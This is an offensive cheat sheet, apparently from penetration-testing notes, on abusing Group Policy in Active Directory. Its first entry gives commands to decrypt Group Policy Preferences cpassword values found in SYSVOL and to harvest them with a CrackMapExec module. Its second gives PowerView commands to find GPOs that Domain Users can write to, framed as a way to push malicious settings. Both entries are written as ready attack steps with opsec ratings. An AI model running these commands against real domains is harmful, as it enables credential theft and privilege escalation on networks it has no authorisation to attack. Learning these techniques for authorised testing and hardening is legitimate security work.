# GPO Abuse Attacks

### GPP Password Decryption (Group Policy Preferences) [added: 2026-04]
- **Tags:** #GPP #cpassword #gpp-decrypt #CrackMapExec #SYSVOL #GroupPolicyPreferences #T1552
- **Trigger:** SYSVOL accessible and GPP XML files found containing cpassword values
- **Prereq:** Read access to SYSVOL share (any domain user)
- **Yields:** Plaintext passwords from legacy Group Policy Preferences
- **Opsec:** Low
- **Context:** Found cpassword in SYSVOL GPP XML files (Groups.xml, Scheduledtasks.xml, etc.) -- decrypt with known AES key published by Microsoft
- **Payload/Method:**
  ```bash
  # Decrypt captured GPP cpassword
  gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

  # Auto-find GPP passwords via CrackMapExec
  crackmapexec smb 172.16.5.5 -u user -p pass -M gpp_autologin

  # Browse SYSVOL scripts folder for cleartext creds
  ls \\DC01\SYSVOL\DOMAIN.LOCAL\scripts
  ```

### GPO ACL Abuse — Domain Users with Write Rights on GPO [added: 2026-04]
- **Tags:** #GPOAbuse #ACLAbuse #PowerView #WriteDACL #GroupPolicy #PrivilegeEscalation #T1484
- **Trigger:** BloodHound or ACL enumeration shows write access to a GPO linked to target OU
- **Prereq:** Write permissions on a GPO object (e.g., via Domain Users misconfiguration)
- **Yields:** Ability to push malicious settings/scripts to all hosts/users in GPO scope
- **Opsec:** Med
- **Context:** Check if Domain Users (or another group you control) has write access to any GPO -- can modify GPO to push malicious settings/scripts
- **Payload/Method:**
  ```powershell
  # Enumerate GPOs
  Get-DomainGPO | select displayname
  Get-GPO -All | Select DisplayName

  # Check if Domain Users can modify any GPO
  $sid = Convert-NameToSid "Domain Users"
  Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

  # Resolve GPO name from GUID
  Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
  ```
